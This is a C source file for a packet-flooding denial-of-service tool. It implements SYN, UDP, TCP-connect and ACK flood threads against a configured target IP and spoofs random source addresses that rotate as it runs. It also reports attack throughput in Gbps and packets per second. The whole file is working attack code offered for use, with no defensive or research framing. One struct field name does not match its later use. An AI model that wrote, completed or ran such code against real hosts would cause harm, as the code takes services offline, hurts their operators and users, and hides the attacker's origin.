#include "flood.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>

// Global state
volatile int running = 1;
global_stats_t stats;

void sigint_handler(int sig) {
    (void)sig;
    running = 0;
}

double get_time_sec(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// UDP pseudo-header for checksum
struct pseudo_header {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
};

void *syn_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 
                     (config->packet_size > 0 ? config->packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr) : 0);
    
    char *packet = malloc(packet_len);
    memset(packet, 0, packet_len);
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    // Fill payload if there's room
    int payload_len = packet_len - sizeof(struct iphdr) - sizeof(struct tcphdr);
    if (payload_len > 0) {
        memset(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), 
               PACKET_FILL_CHAR, payload_len);
    }
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "Thread %d: socket() failed (run as root)\n", data->thread_id);
        free(packet);
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "Thread %d: setsockopt(IP_HDRINCL) failed\n", data->thread_id);
        close(sock);
        free(packet);
        return NULL;
    }
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->port);
    dest.sin_addr.s_addr = inet_addr(config->target_ip);
    
    unsigned int src_ip = (rand() % 255) << 24 | (rand() % 255) << 16 |
                          (rand() % 255) << 8 | (rand() % 255);
    
    while (running && config->running) {
        // Build IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_len);
        iph->id = htons(rand() % 65535);
        iph->frag_off = htons(0x4000);  // Don't fragment
        iph->ttl = TTL_VALUE;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = src_ip;
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
        
        // Build TCP header
        tcph->source = htons(SOURCE_PORT_MIN + rand() % (SOURCE_PORT_MAX - SOURCE_PORT_MIN));
        tcph->dest = htons(config->port);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(WINDOW_SIZE);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // TCP pseudo-header checksum
        struct pseudo_header psh;
        psh.src_addr = src_ip;
        psh.dst_addr = dest.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        if (payload_len > 0)
            memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct tcphdr),
                   packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload_len);
        
        tcph->check = checksum((unsigned short *)pseudogram, psize);
        free(pseudogram);
        
        sendto(sock, packet, packet_len, 0, 
               (struct sockaddr *)&dest, sizeof(dest));
        
        data->packets_sent++;
        data->bytes_sent += packet_len;
        
        // Rotate source IP occasionally
        if (data->packets_sent % 100 == 0) {
            src_ip = (rand() % 255) << 24 | (rand() % 255) << 16 |
                     (rand() % 255) << 8 | (rand() % 255);
        }
    }
    
    close(sock);
    free(packet);
    return NULL;
}

void *udp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int payload_size = config->packet_size - sizeof(struct iphdr) - sizeof(struct udphdr);
    if (payload_size < 0) payload_size = 1024;
    if (payload_size > 65507) payload_size = 65507;  // Max UDP payload
    
    char *payload = malloc(payload_size);
    memset(payload, PACKET_FILL_CHAR, payload_size);
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        free(payload);
        return NULL;
    }
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->port);
    dest.sin_addr.s_addr = inet_addr(config->target_ip);
    
    while (running && config->running) {
        sendto(sock, payload, payload_size, 0, 
               (struct sockaddr *)&dest, sizeof(dest));
        data->packets_sent++;
        data->bytes_sent += sizeof(struct udphdr) + payload_size;
    }
    
    close(sock);
    free(payload);
    return NULL;
}

void *tcp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int payload_size = config->packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
    if (payload_size < 0) payload_size = 1024;
    
    char *send_buf = malloc(payload_size);
    memset(send_buf, PACKET_FILL_CHAR, payload_size);
    
    while (running && config->running) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;
        
        struct timeval tv = {2, 0};  // 2 second timeout
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(config->port);
        dest.sin_addr.s_addr = inet_addr(config->target_ip);
        
        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
            // Send data in a loop until timeout
            for (int i = 0; i < 10 && running && config->running; i++) {
                int sent = send(sock, send_buf, payload_size, 0);
                if (sent > 0) {
                    data->packets_sent++;
                    data->bytes_sent += sent;
                }
            }
        }
        
        close(sock);
    }
    
    free(send_buf);
    return NULL;
}

void *ack_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    char *packet = malloc(packet_len);
    memset(packet, 0, packet_len);
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { free(packet); return NULL; }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->port);
    dest.sin_addr.s_addr = inet_addr(config->target_ip);
    
    unsigned int src_ip = (rand() % 255) << 24 | (rand() % 255) << 16 |
                          (rand() % 255) << 8 | (rand() % 255);
    
    while (running && config->running) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_len);
        iph->id = htons(rand() % 65535);
        iph->frag_off = htons(0x4000);
        iph->ttl = TTL_VALUE;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = src_ip;
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
        
        tcph->source = htons(SOURCE_PORT_MIN + rand() % (SOURCE_PORT_MAX - SOURCE_PORT_MIN));
        tcph->dest = htons(config->port);
        tcph->seq = htonl(rand());
        tcph->ack_seq = htonl(rand());
        tcph->doff = 5;
        tcph->ack = 1;  // ACK flag
        tcph->window = htons(WINDOW_SIZE);
        tcph->check = 0;
        
        struct pseudo_header psh;
        psh.src_addr = src_ip;
        psh.dst_addr = dest.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        char *pseudogram = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr));
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
        free(pseudogram);
        
        sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        data->packets_sent++;
        data->bytes_sent += packet_len;
        
        if (data->packets_sent % 200 == 0)
            src_ip = (rand() % 255) << 24 | (rand() % 255) << 16 |
                     (rand() % 255) << 8 | (rand() % 255);
    }
    
    close(sock);
    free(packet);
    return NULL;
}

void print_stats(global_stats_t *s, attack_config_t *config) {
    double elapsed = get_time_sec() - s->start_time;
    if (elapsed <= 0) elapsed = 0.001;
    
    unsigned long long pkts = s->total_packets;
    unsigned long long bytes = s->total_bytes;
    
    double mb_sent = bytes / (1024.0 * 1024.0);
    double mbps = mb_sent / elapsed;
    double gbps = (bytes * 8.0) / (elapsed * 1e9);
    double pkts_per_sec = pkts / elapsed;
    
    printf("\r[>] %llu packets | %.1f MB (%.3f GB) | %.1f MB/s | %.2f Gbps | %.0f pps      ",
           pkts, mb_sent, mb_sent / 1024.0, mbps, gbps, pkts_per_sec);
    fflush(stdout);
}
